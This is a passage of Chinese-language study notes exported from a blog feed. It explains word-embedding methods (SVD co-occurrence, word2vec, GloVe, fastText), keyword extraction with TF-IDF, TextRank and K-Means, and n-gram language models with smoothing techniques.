inline">\(X\)</span>，具体是这么做的：遍历海量的文件，每次词组i出现在文件j中时，将<span class="math inline">\(X_{ij}\)</span>的值加1。这会是个很大的矩阵<span class="math inline">\(R^{|V|×M}\)</span>，而且矩阵大小还和文档个数M有关系。</p><h4><span id="基于窗口的共现矩阵x">基于窗口的共现矩阵X</span></h4><p>​规定一个固定大小的滑动窗口，然后统计每个中心词所在窗口中相邻词的词频。</p><blockquote><ol type="1"><li>I enjoy flying.</li><li>I like NLP.</li><li>I like deep learning.</li></ol><p>有：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224205921462.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p></blockquote><p>​ 对X做奇异值分解，只保留前k个维度：</p><p>​ 把子矩阵<span class="math inline">\(U_{1:|V|,1:k}\)</span>视作我们的词嵌入矩阵。也就是说，对于词表中的每一个词，我们都用一个k维的向量来表达了。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224210202562.png" srcset="/img/loading.gif" lazyload></p><p>​ 问题在于：</p><blockquote><ul><li>矩阵的维度会经常变化（新的词语经常会增加，语料库的大小也会随时变化）。</li><li>矩阵是非常稀疏的，因为大多数词并不同时出现。</li><li>矩阵的维度通常非常高（<span class="math inline">\(≈10^6×10^6\)</span>）</li><li>训练需要<span class="math inline">\(O(n^2)\)</span>的复杂度（比如SVD）</li><li>需要专门对矩阵X进行特殊处理，以应对词组频率的极度不平衡的状况</li></ul></blockquote><p>​ 有一些办法可以缓解一下上述提到的问题：</p><blockquote><ul><li>忽视诸如“he”、“the” 、“has”等功能词。</li><li>应用“倾斜窗口”（rampwindow），即:根据文件中词组之间的距离给它们的共现次数增加相应的权重。</li><li>使用皮尔森的相关性（Pearsoncorrelation），将0记为负数，而不是它原来的数值。</li></ul></blockquote><h3><span id="基于神经网络的表示方法">基于神经网络的表示方法</span></h3><blockquote><p>​ 如果数据量不足，不要从零开始训练自己的词向量</p></blockquote><h4><span id="连续词袋模型cbow">连续词袋模型（CBOW）</span></h4><p>以上下文，预测中心词。</p><ul><li><span class="math inline">\(w_i\)</span>:单词表V中的第i个单词，i维是1其他维是0的one-hot向量</li><li><span class="math inline">\(v\in R^{n*|V|}\)</span>：输入词矩阵</li><li><span class="math inline">\(v_i\)</span>：V的第i列，单词<span class="math inline">\(w_i\)</span>的输入向量</li><li><span class="math inline">\(u\in R^{|V|*n}\)</span>：输出词矩阵</li><li><span class="math inline">\(u_i\)</span>：U的第i行，单词<span class="math inline">\(w_i\)</span>的输出向量</li><li><span class="math inline">\(n\)</span>：“嵌入空间”（embeddingspace）的维度</li></ul><p>整个过程:</p><ol type="1"><li>对于m个词长度的窗口，one-hot向量（<span class="math inline">\(x^{(c-m)},\cdots,x^{(c-1)},x^{(c+1)},\cdots,x^{(c+m)}\)</span>）。</li><li>上下文的嵌入词向量（<span class="math inline">\(v_{c-m+1}=Vx^{(c-m+1)},\cdots,v_{c+m}=Vx^{(c+m)}\)</span> ）</li><li>将这些向量取平均<span class="math inline">\(\hatv={v_{c-m}+v_{c-m+1}+\cdots+v_{c+m}\over2m}\)</span></li><li>产生一个logits向量 <span class="math inline">\(z=U\hatv\)</span></li><li>将得分向量转换成概率分布形式<span class="math inline">\(\haty=softmax(z)\)</span></li><li><span class="math inline">\(y\)</span>是 <span class="math inline">\(x^{c}\)</span> 的one-hot向量。计算损失<span class="math display">\[H(\hat y,y)=-\sum_{j=1}^{|V|}y_jlog(\haty_j)\]</span></li></ol><p>y只是一个one-hot向量，于是上面的损失函数就可以简化为：</p><p>​ <span class="math display">\[H(\hat y,y)=-y_ilog(\haty_i)\]</span></p><p>最终的优化目标为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224212732985.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><p>用梯度下降法去更新每一个相关的词向量𝑢𝑐和𝑣𝑗</p><h4><span id="skip-gram">Skip-Gram</span></h4><p>以中心词预测上下文。</p><ul><li><span class="math inline">\(w_i\)</span>:单词表V中的第i个单词，i维是1其他维是0的one-hot向量</li><li><span class="math inline">\(v\in R^{n*|V|}\)</span>：输入词矩阵</li><li><span class="math inline">\(v_i\)</span>：V的第i列，单词<span class="math inline">\(w_i\)</span>的输入向量</li><li><span class="math inline">\(u\in R^{|V|*n}\)</span>：输出词矩阵</li><li><span class="math inline">\(u_i\)</span>：U的第i行，单词<span class="math inline">\(w_i\)</span>的输出向量</li><li><span class="math inline">\(n\)</span>：“嵌入空间”（embeddingspace）的维度</li></ul><p>整个过程:</p><ol type="1"><li>生成one-hot输入向量x。</li><li>得到上下文的嵌入词向量<span class="math inline">\(v_c=Vx\)</span>。</li><li>不需要取平均值的操作，所以直接是<span class="math inline">\(v_c\)</span>。</li><li>通过<span class="math inline">\(u=Uv_c\)</span>产生2m个logits向量<span class="math inline">\(u_{c-m},\cdots,u_{c-1},u_{c+1},\cdots,u_{(c+m)}\)</span>。</li><li>将logits向量转换成概率分布形式<span class="math inline">\(y=softmax(u)\)</span>。</li><li>产生的概率分布与真实概率分布<span class="math inline">\(y^{c-m},\cdots,y^{c-1},,y^{c+1}\cdots,y^{c+m}\)</span>计算交叉熵损失。</li></ol><p>最终的优化目标为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224213858892.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><p>不同的地方是我们这里需要引入朴素贝叶斯假设来将联合概率拆分成独立概率相乘。</p><h4><span id="负例采样negative-sampling">负例采样（Negative Sampling）</span></h4><p>​对整个单词表|V|求和的计算量是非常巨大的，任何一个对目标函数的更新和求值操作都会有O(|V|)的时间复杂度。我们需要一个思路去简化一下，我们想办法去求它的近似。</p><p>​ Mikolov ET AL.在他的《Distributed Representations of Words andPhrases and their Compositionality》中提出了负例采样。</p><p>​ 考虑一个“词-上下文”对（w,c），令P(D = 1|w, c)为(w,c)来自于语料库的概率。相应的，P(D = 0|w, c)则是不来自于语料库的概率。对P(D = 1|w, c)用sigmoid函数建模：</p><p>​ <span class="math display">\[p(D=1|w,c,\theta)={1\over{1+e^{(-v_c^Tv_w)}}}\]</span></p><p>​ 建立一个新的目标函数。如果(w,c)真是来自于语料库，目标函数能够最大化P(D = 1|w, c)。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224214508047.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><p>​ <span class="math inline">\(\tildeD\)</span>表示不来自于语料库的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224215744317.png" srcset="/img/loading.gif" lazyload></p><p>​ 在skip gram中，对于<span class="math inline">\(c - m +j\)</span>位置的context 和 center word的目标函数为：（所有上下文还要求和）</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224220227855.png" srcset="/img/loading.gif" lazyload></p><p>​ K -- 为负例样本的个数。</p><p>​ 这样将 <span class="math inline">\(|V|\)</span>words中的softmax，变成了 K个负例中进行 sigmoid，减少了计算量。多分类目标变为二分类目标。</p><p>​ 在CBOW中为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200224220549264.png" srcset="/img/loading.gif" lazyload></p><p>​ 负例采样在word的词频分布的3/4次方上进行采样。使得分布更平滑。</p><h4><span id="hierarchical-softmax">Hierarchical Softmax</span></h4><p>​ 对CBOW或者Skip gram的最后一层损失求解方式改进。目标不是目标单词的onehot编码，而是在所有单词预先构建好的Huffam tree中的huffman编码。</p><p>​ 损失函数由Huffamtree中每个node的sigmoid函数预测结果和实际的huffman编码之间计算求得。</p><p>​ Huffman tree保证了任何一个单词的编码不会是另一个单词的前缀。</p><blockquote><p>​ 构建流程：</p><ol type="1"><li>根据所有单词的词频构建最小堆。</li><li>取出前两个最小单词（left child and rightchild），将二者词频之和作为新节点插入最小堆。</li><li>构建哈夫曼树，建立新树节点作为left child and rightchild的父节点，将上一步的left child and rightchild二者词频之和作为的该父节点的值，构建tree。</li><li>重复2、3步骤，直到minheap中只有一个node，此时，将这一个node作为tree的root。Huffamtree构建完毕。</li></ol></blockquote><p>​ huffman编码：从root到leaf node的路径，走left child编码加入0，走rightchild编码加入1。最终编码为该leaf node对应的编码。</p><p>​ 越常用的词（词频越高的词）拥有更短的编码。</p><p>​word2vec中正好采用了相反的编码规则，规定沿着左子树走，那么就是负类(哈夫曼树编码1)，沿着右子树走，那么就是正类(哈夫曼树编码0)。</p><p>​ 每个tree node处：</p><p>​ <span class="math display">\[p(+)={1\over{1+e^{(-v_w^T\theta)}}}\]</span></p><p>​ 每个tree node都有参数<span class="math inline">\(\theta\)</span>，输入是skipgram模型最终输出的向量<span class="math inline">\(v_w\)</span>。</p><h4><span id="glove">Glove</span></h4><p>​ 加入了global statistics，用某个大小window中两个单词的共现次数<span class="math inline">\(X_{ij}\)</span>表示。</p><ul><li>目标函数由cross entropy变为least square。</li><li>用<span class="math inline">\(log(X_{ij})\)</span>作为“normalizationcost”。（<span class="math inline">\(X_{ij}\)</span> : number of timesword j occur in the context of word i）</li><li><span class="math inline">\(v_i\)</span>和<span class="math inline">\(u_j\)</span>相乘，不需要用指数函数。(推导结果)</li><li>加入weighted function <span class="math inline">\(f(X_{ij})\)</span></li></ul><p>损失函数： <span class="math display">\[J=\sum_{i=1}^{V} \sum_{j=1}^{V} f\left(X_{i j}\right)\left(w_{i}^{T}w_{j}+b_{i}+b_{j}-\log X_{i j}\right)^{2}\]</span></p><blockquote><p><span class="math inline">\(X_{ij}\)</span> --<span class="math inline">\(i\ \textrm{and}\j\)</span>在某个窗口大小中的共现频率<br><span class="math inline">\(f(X_{ij})\)</span>--权重系数，共现越多的pair对于目标函数贡献应该越大，但是又不能无限制增大，所以对共现频率过于大的pair 限定最大值，以防训练的时候被这些频率过大的 pair主导了整个目标函数。<br>b --两个偏置项<br><span class="math inline">\(w_{i}\)</span> --当前词的向量， <span class="math inline">\(w_{j}\)</span>--对应的是与其在同一个窗口中出现的共现词的词向量，两者的向量点乘要去尽量拟合它们共现频率的对数值</p></blockquote><p>​如果两个词共现频率越高，那么其对数值当然也越高，因而算法要求二者词向量的点乘也越大。</p><p>​ 而两个词向量的点乘越大，其实包含了两层含义：</p><blockquote><ul><li>第一，要求各自词向量的模越大，通常来说，除去频率非常高的词（比如停用词），对于有明确语义的词来说，它们的<strong>词向量模长会随着词频增大而增大</strong>，因此两个词共现频率越大，要求各自词向量模长越大是有直觉意义的</li><li>第二，要求这两个词向量的夹角越小，这也是符合直觉的，因为<strong>出现在同一个语境下频率越大，说明这两个词的语义越接近，因而词向量的夹角也偏向于越小</strong>。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示.assets/image-20200225224943995.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><h4><span id="fasttext">fastText</span></h4><p>​ word2vec 和 GloVe都不需要人工标记的监督数据，只需要语言内部存在的监督信号即可以完成训练。而与此相对应的，<strong>fastText则是利用带有监督标记的文本分类数据完成训练。</strong></p><p>​ 类似CBOW，但不同点在于：</p><ol type="1"><li>在输入数据上，CBOW输入的是一段区间中除去目标词之外的所有其他词的向量加和或平均，而<strong>fastText 为了利用更多的语序信息</strong>，将 bag-of-words 变成了bag-of-features，也就是输入 x不再仅仅是一个词，还可以<strong>加上字符级别的 bigram 或者是 trigram的信息</strong>等等。</li><li>第二个不同在于，CBOW 预测目标是语境中的一个词，而 <strong>fastText预测目标是当前这段输入文本的类别</strong>，正因为需要这个文本类别，因此才说fastText 是一个监督模型。</li></ol><p>​ fastText 的网络结构和 CBOW 基本一致，同时在输出层的分类上也使用了Hierachical Softmax 技巧来加速训练。</p><p>​ 目标函数： <span class="math display">\[-\frac{1}{N} \sum_{n=1}^{N} y_{n} \log f\left(B A x_{n}\right)\]</span></p><p><span class="math display">\[x_{n}=\sum_{i=1}^{l_{n}} x_{n, i}\]</span></p><blockquote><p><span class="math inline">\(x_{n, i}\)</span> --语料当中第 n篇文档的第 i 个（词 或者 char N-gram）</p><p>A --最终可以获取的词向量信息</p></blockquote><h3><span id="词向量的作用与获取">词向量的作用与获取</span></h3><p>​ 高阶的深度学习自然语言处理任务，都可以用词向量作为基础。可以从<a href="https://github.com/Embedding/Chinese-Word-Vectors">开源链接</a>获取。</p><h4><span id="词向量的意义">词向量的意义</span></h4><ul><li>基于词与其他词的某种共现关系<ul><li>skip-gram with negative-sampling 与 PMI矩阵的等价性证明《Neural-Word-Embeddings-as-Implicit-Matrix-Factorization》<ul><li>神经网络与SVD的求解方法只是降维方式的不同</li><li>神经网络更像MF，而MF与SVD的降维的约束条件不同，神经网络的目标函数与MF的目标函数也不同</li></ul></li><li>GloVe与MF关系更近<ul><li>目标函数更像</li><li>CBOW没有类似的降维矩阵对应</li></ul></li></ul></li><li>基于语言模型<ul><li>词向量与语言模型本来是两个独立的NLP问题领域，因为深度学习联系在了一起。</li><li>基于词向量构建成句子向量进而进而完成语言模型的任务</li></ul></li><li>基于其他监督学习任务<ul><li>词向量并不只是语言模型可以得到，基于有监督学习也可以得到：C&amp;W<a href="http://licstar.net/archives/328#s22">了解</a></li><li>基于词向量构建成句子向量进而完成文本分类或文本相似度判断的任务</li></ul></li></ul><hr><h2><span id="4关键词提取">4.关键词提取</span></h2><h3><span id="tf-idf文本关键词抽取方法">TF-IDF文本关键词抽取方法</span></h3><p>（1）对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn]；</p><p>（2） 计算词语ti 在文本D中的词频；</p><p>（3） 计算词语ti 在整个语料的IDF=log (Dn /(Dt +1))，Dt为语料库中词语ti 出现的文档个数；</p><p>（4） 计算得到词语ti的TF-IDF=TF*IDF，并重复（2）—（4）得到所有候选关键词的TF-IDF数值；</p><p>（5）对候选关键词计算结果进行倒序排列，得到排名前TopN个词汇作为文本关键词。</p><h3><span id="基于textrank的文本关键词抽取方法">基于TextRank的文本关键词抽取方法</span></h3><p>（1）对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn]；</p><p>（2）构建候选关键词图G=(V,E)，其中V为节点集，由候选关键词组成，并采用共现关系构造任两点之间的边，两个节点之间仅当它们对应的词汇在长度为K的窗口中共现则存在边，K表示窗口大小即最多共现K个词汇；</p><p>（3）根据公式迭代计算各节点的权重，直至收敛；(见中文文本处理部分)</p><p>（4）对节点权重进行倒序排列，得到排名前TopN个词汇作为文本关键词。</p><h3><span id="基于word2vec词聚类的文本关键词抽取方法">基于Word2Vec词聚类的文本关键词抽取方法</span></h3><p>（1） 对Wiki中文语料进行Word2vec模型训练，<a href="./code/gensim-word2vec.html">代码</a></p><p>（2）对于给定的文本D进行分词、词性标注和去除停用词等数据预处理操作。得到n个候选关键词，即D=[t1,t2,…,tn]；</p><p>（3）遍历候选关键词，从词向量文件中抽取候选关键词的词向量表示，即WV=[v1，v2，…，vm]；</p><p>（4） 对候选关键词进行K-Means聚类，得到各个类别的聚类中心；</p><p>（5）计算各类别下，组内词语与聚类中心的距离（欧几里得距离），按聚类大小进行升序排序；</p><p>（6） 对候选关键词计算结果得到排名前TopN个词汇作为文本关键词。</p><p>步骤（4）中需要人为给定聚类的个数，具体参考文档主题的个数。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> KMeans<br><span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkeywords_kmeans</span><span class="hljs-params">(data,topK)</span>:</span><br>    words = data[<span class="hljs-string">"word"</span>] <span class="hljs-comment"># 词汇</span><br>    vecs = data.ix[:,<span class="hljs-number">1</span>:] <span class="hljs-comment"># 向量表示</span><br><br>    kmeans = KMeans(n_clusters=<span class="hljs-number">1</span>,random_state=<span class="hljs-number">10</span>).fit(vecs)<br>    labels = kmeans.labels_ <span class="hljs-comment">#类别结果标签</span><br>    labels = pd.DataFrame(labels,columns=[<span class="hljs-string">'label'</span>])<br>    new_df = pd.concat([labels,vecs],axis=<span class="hljs-number">1</span>)<br>    vec_center = kmeans.cluster_centers_ <span class="hljs-comment">#聚类中心</span><br>    <br>    <span class="hljs-comment"># 计算距离（相似性） 采用欧几里得距离（欧式距离）</span><br>    distances = []<br>    vec_words = np.array(vecs) <span class="hljs-comment"># 候选关键词向量，dataFrame转array</span><br>    vec_center = vec_center[<span class="hljs-number">0</span>] <span class="hljs-comment"># 第一个类别聚类中心,本例只有一个类别</span><br>    length = len(vec_center) <span class="hljs-comment"># 向量维度</span><br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(len(vec_words)): <span class="hljs-comment"># 候选关键词个数</span><br>        cur_wordvec = vec_words[index] <span class="hljs-comment"># 当前词语的词向量</span><br>        dis = <span class="hljs-number">0</span> <span class="hljs-comment"># 向量距离</span><br>        <span class="hljs-keyword">for</span> index2 <span class="hljs-keyword">in</span> range(length):<br>            dis += (vec_center[index2]-cur_wordvec[index2])*(vec_center[index2]-cur_wordvec[index2])<br>        dis = math.sqrt(dis)<br>        distances.append(dis)<br>    distances = pd.DataFrame(distances,columns=[<span class="hljs-string">'dis'</span>])<br><br>    result = pd.concat([words, labels ,distances], axis=<span class="hljs-number">1</span>) <span class="hljs-comment"># 拼接词语与其对应中心点的距离</span><br>    result = result.sort_values(by=<span class="hljs-string">"dis"</span>,ascending = <span class="hljs-literal">True</span>) <span class="hljs-comment"># 按照距离大小进行升序排序</span><br></code></pre></div></td></tr></table></figure><p>可使用PCA降维，但具体视效果而定。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastText </tag>
            
            <tag> representation </tag>
            
            <tag> word2vec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言模型</title>
      <link href="/posts/3423f471.html"/>
      <url>/posts/3423f471.html</url>
      
        <content type="html"><![CDATA[<p>自然语言处理是关于计算机科学和语言学的交叉学科，常见的研究任务包括：</p><ul><li>分词（Word Segmentation或Word Breaker，WB）</li><li>信息抽取（InformationExtraction，IE）：命名实体识别和关系抽取（Named Entity Recognition &amp;Relation Extraction，NER）</li><li>词性标注（Part Of Speech Tagging，POS）</li><li>指代消解（Coreference Resolution）</li><li>句法分析（Parsing）</li><li>词义消歧（Word Sense Disambiguation，WSD）</li><li>语音识别（Speech Recognition）</li><li>语音合成（Text To Speech，TTS）</li><li>机器翻译（Machine Translation，MT）</li><li>自动文摘（Automatic Summarization）</li><li>问答系统（Question Answering）</li><li>自然语言理解（Natural Language Understanding）</li><li>OCR</li><li>信息检索（Information Retrieval，IR）</li></ul><h1><span id="语言模型与应用">语言模型与应用</span></h1><p>​上个世纪80年代后期，机器学习算法被引入到自然语言处理中，这要归功于不断提高的计算能力。</p><p>​研究主要集中在统计模型上，这种方法采用大规模的训练语料（corpus）对模型的参数进行自动的学习，和之前的<strong>基于规则的方法相比</strong>，这种方法更具鲁棒性。</p><h2><span id="语言模型">语言模型</span></h2><p>​语言模型简单来讲，就是计算一个句子的概率，更确切的说是计算组成这个句子一系列词语的概率。</p><p>对一句话𝑆=𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,…,𝑥𝑛S=x1,x2,x3,x4,x5,…,xn而言，它的概率</p><blockquote><p>𝑃(𝑆)=𝑃(𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,…,𝑥𝑛)=𝑃(𝑥1)𝑃(𝑥2|𝑥1)𝑃(𝑥3|𝑥1,𝑥2)...𝑃(𝑥𝑛|𝑥1,𝑥2,...,𝑥𝑛−1)</p></blockquote><p>​联合概率链规则公式考虑到了所有的词和词之间的依赖关系，但是非常复杂。使用<strong>马尔科夫假设（MarkovAssumption）</strong>简化：下一个词的出现仅依赖于它前面的一个或几个词。</p><p>​ 二元语法（bigram，2-gram）:</p><p><span class="math inline">\(P(x_1,x_2,x_3,x_4,x_5,x_6,x_7,x_8,x_9,x_{10})=P(x_1)P(x_2|x_1)P(x_3|x_2)P(x_4|x_3)..P(x_{10}|x_9)\)</span></p><p>​ 三元语法（trigram，3-gram）:</p><p>𝑃(𝑥1,𝑥2,𝑥3,𝑥4,𝑥5,𝑥6,𝑥7,𝑥8,𝑥9,𝑥10)=𝑃(𝑥1)𝑃(𝑥2|𝑥1)𝑃(𝑥3|𝑥1,𝑥2)𝑃(𝑥4|𝑥2,𝑥3)×...×𝑃(𝑥10|𝑥8,𝑥9)</p><p>​为什么叫“语言模型”？因为这是统计学意义上的模型，又跟语言相关，所以叫语言模型。统计模型指一系列分布，参数模型指一系列可用有限个参数表示的模型。语言模型就是一种参数模型，它的参数是矩阵的所有cell。</p><h2><span id="选择n-gram的n">选择N-gram的N</span></h2><p>​ 理论上，只要有足够大的语料，n越大越好，毕竟这样考虑的信息更多</p><p>条件概率为统计计数：</p><blockquote><p>𝑃(“优惠”|“发票”,“点数”)= (“发票”,“点数”，“优惠”) 出现的次数 /(“发票”,“点数”)出现的次数</p></blockquote><ol type="1"><li>实际情况往往是训练语料很有限，很容易产生数据稀疏，不满足大数定律，算出来的概率失真。比如(“发票”,“点数”，“优惠”)在训练集中竟没有出现，就会导致零概率问题。</li></ol><blockquote><p>大数定律：样本数量越多，其算术平均值就越趋近期望值。</p></blockquote><ol start="2" type="1"><li>另一方面，如果n很大，参数空间过大，产生维数灾难。假设词表的大小为100000，那么n-gram模型的参数数量为<span class="math inline">\(100000^n\)</span>。这么多的参数，估计内存就不够放了。</li></ol><p>​ 如何选择依赖词的个数n呢？</p><ul><li>经验上，trigram用的最多。尽管如此，原则上，能用bigram解决，绝不使用trigram。n取≥4的情况较少。</li><li>当ｎ更大时：对下一个词出现的约束信息更多，具有更大的辨别力；</li><li>当ｎ更小时：在训练语料库中出现的次数更多，具有更可靠的统计信息，具有更高的可靠性、实用性。</li></ul><h2><span id="n-gram语言模型应用">N-gram语言模型应用</span></h2><h3><span id="词性标注">词性标注</span></h3><p><strong>词性标注是一个典型的多分类问题</strong>。</p><blockquote><p><strong>“爱”作为动词还是比较常见的。所以可以统一给“爱”分配为“动词”</strong>。这种最简单的思想非常好实现，如果准确率要求不高则也比较常用。<strong>它只需要基于词性标注语料库做一个统计就够了，连贝叶斯方法、最大似然法都不要用</strong>。</p></blockquote><p><strong>可以引入2-gram模型提升匹配的精确度。</strong></p><p>𝑃(词性𝑖|“很”的词性（副词），“爱") =前面被“副词”修饰的“爱"作为“词性𝑖”的次数 /前面被“副词”修饰的“爱"出现的次数；𝑖=1,2,3...</p><h3><span id="垃圾邮件识别">垃圾邮件识别</span></h3><p>一个可行的思路如下：</p><ul><li>先对邮件文本进行断句，以句尾标点符号（“。” “!”“？”等）为分隔符将邮件内容拆分成不同的句子。</li><li>用<strong>N-gram分类器</strong>判断每个句子是否为垃圾邮件中的敏感句子。</li><li>当被判断为敏感句子的数量超过一定数量（比如3个）的时候，认为整个邮件就是垃圾邮件。</li></ul><p>根据贝叶斯公式有：</p><blockquote><p>𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖)；𝑖=1,2</p></blockquote><p><strong>对𝑃(𝑋|𝑌𝑖)P(X|Yi) 套用2-gram模型。</strong> 则上式化简为：</p><blockquote><p>𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖)∝𝑃(𝑥1|𝑌𝑖)𝑃(𝑥2|𝑥1，𝑌𝑖)𝑃(𝑥3|𝑥2，𝑌𝑖)...𝑃(𝑥10|𝑥9，𝑌𝑖)𝑃(𝑌𝑖)</p></blockquote><p>因为这种方法<strong>考虑到了词语前面的一个词语的信息</strong>，同时也考虑到了<strong>部分语序信息</strong>，因此区分效果会<strong>比单纯用朴素贝叶斯方法更好</strong>。</p><h4><span id="n-gram方法在实际应用中有一些tricks">N-gram方法在实际应用中有一些tricks</span></h4><ol type="1"><li>从区分度来看，3-gram方法更好些。</li><li><strong>可以考虑在其前面再添加一个句子起始符号如“<𝑠>”，这样我们就不必单独计算𝑃(“我”|𝑌𝑖)，而是替换为计算𝑃(“我”|“<𝑠>”,𝑌𝑖)。形式上与2-gram统一。</𝑠></𝑠></strong>这样统计和预测起来都比较方便。(一般地，如果采用N-gram模型，可以在文本开头加入n-1个虚拟的开始符号)</li><li><strong>N-gram模型也会发生零概率问题，也需要平滑技术</strong></li></ol><h3><span id="中文分词">中文分词</span></h3><p>中文分词技术是“中文NLP中，最最最重要的技术之一”，重要到某搜索引擎厂有专门的team在集中精力优化这一项工作，重要到能影响双语翻译百分位的准确度，能影响某些query下搜索引擎百分位的广告收入。</p><p><strong>中文分词也可以理解成一个多分类的问题。</strong>𝑋表示被分词的句子，<strong>用𝑌𝑖表示该句子的一个分词方案。</strong></p><p>𝑃(𝑌𝑖|𝑋)∝𝑃(𝑋|𝑌𝑖)𝑃(𝑌𝑖)；𝑖=1,2,3...</p><blockquote><p><strong>NOTE：任意假想的一种分词方式之下生成的句子总是唯一的</strong>（只需把分词之间的分界符号扔掉剩下的内容都一样）。于是<strong>可以将𝑃(𝑋|𝑌𝑖)看作是恒等于1</strong>的。这样贝叶斯公式又进一步化简成为：</p></blockquote><p>𝑃(𝑌𝑖|𝑋)∝𝑃(𝑌𝑖)；𝑖=1,2,3...</p><p>采用2-gram。于是有：</p><blockquote><ol type="1"><li>𝑃(𝑌1)=𝑃(“我司”，“可”，“办理”，“正规发票”)=𝑃(“我司”)𝑃(“可”|“我司”)𝑃(“办理”|“可”)𝑃(“正规发票”|“办理”）</li><li>𝑃(𝑌2)=𝑃(“我”，“司可办”，“理正规”，“发票”)=𝑃(“我”)𝑃(“司可办”|“我”)𝑃(“理正规”|“司可办”)𝑃(“发票”|“理正规”）</li></ol></blockquote><h3><span id="机器翻译与语音识别">机器翻译与语音识别</span></h3><p>N-gram语言模型在机器翻译和语音识别等顶级NLP应用中也有很大的用途。</p><p>用于判断生成的语句的后验概率相对大小。</p><h2><span id="平滑技术">平滑技术</span></h2><h4><span id="拉普拉斯平滑">拉普拉斯平滑</span></h4><p>最简单的平滑技术是拉普拉斯平滑，</p><p>加一平滑法，其<strong>保证每个n-gram在训练语料中至少出现1次</strong>（或者加k）。</p><p>分母加上<span class="math inline">\(k * |V|\)</span></p><h4><span id="back-off方法">Back-off方法</span></h4><p>考虑k-1元gram</p><h4><span id="插值法">插值法</span></h4><p>多种gram加权</p><blockquote><p>一元组 <span class="math inline">\((w_{i})\)</span>出现的次数平均比二元组 <span class="math inline">\((w_{i−1},w_{i})\)</span>出现的次数要多很多，根据大数定律，它的相对频度更接近概率分布。类似地，二元组平均出现的次数比三元组要高，二元组的相对频度比三元组更接近概率分布。</p><p>同时，低阶模型的零概率问题也比高阶模型轻。</p></blockquote><p><span class="math display">\[P(w_i\midw_{i-2},w_{i-1})=\lambda(w_{i-2},w_{i-1})\cdot f(w_i\midw_{i-2},w_{i-1}) +\lambda(w_{i-1})\cdot f(w_i\mid w_{i-1})+\lambdaf(w_i)\]</span></p><p>其中，三个 λ 为插值权重，均为正数且和为 1。</p><p><strong>线性插值法的效果比卡茨退避法略差</strong>，故现在已经较少使用了。</p><h4><span id="古德-图灵">古德-图灵</span></h4><blockquote><p>在统计中相信可靠的统计数据，而对不可信的统计数据打折扣的一种概率估计方法。</p></blockquote><p>古德-图灵估计的原理是：</p><p>对于没看见的事件，我们不能认为它发生的概率就是零，因此我们从概率的总量(ProbabilityMass)中，<strong>分配一个很小的比例给这些没有看见的事件</strong>。这样一来，看见了的事件的概率总和就小于1了。因此，需要<strong>将所有看见了的事件概率调小一点</strong>，并且按照“<strong>越是不可信的统计折扣越多</strong>”的方法进行。</p><p>假定在语料库中出现 r 次的词有 𝑁𝑟个，特别地，未出现的词数量为𝑁0。语料库的大小为 N。那么，很显然：</p><p><span class="math display">\[N=\sum_{r=1}^{\infty}rN_r\]</span></p><p>出现 r 次的词在整个语料库中的相对频度(Relative Frequency)则是 <span class="math inline">\(r/N_r\)</span>。</p><p>当 r 比较小时，它的统计可能不可靠，因此在计算那些出现 r次的词的概率时，要使用一个更小一点的次数，是 <span class="math inline">\(d_r\)</span>（而不直接使用r）。</p><p><span class="math display">\[d_r = (r+1)\cdotN_{r+1}/N_r\]</span></p><p>显然</p><p><span class="math display">\[\sum_rd_r\cdot N_r=N\]</span></p><p><strong>根据 <span class="math inline">\(Zipf\)</span>定律，一般情况下 <span class="math inline">\(N_{r+1}&lt;N_r\)</span>，因而 <span class="math inline">\(d_r&lt;r\)</span>，从而 <span class="math inline">\(d_0&gt;0\)</span>。</strong></p><blockquote><p><span 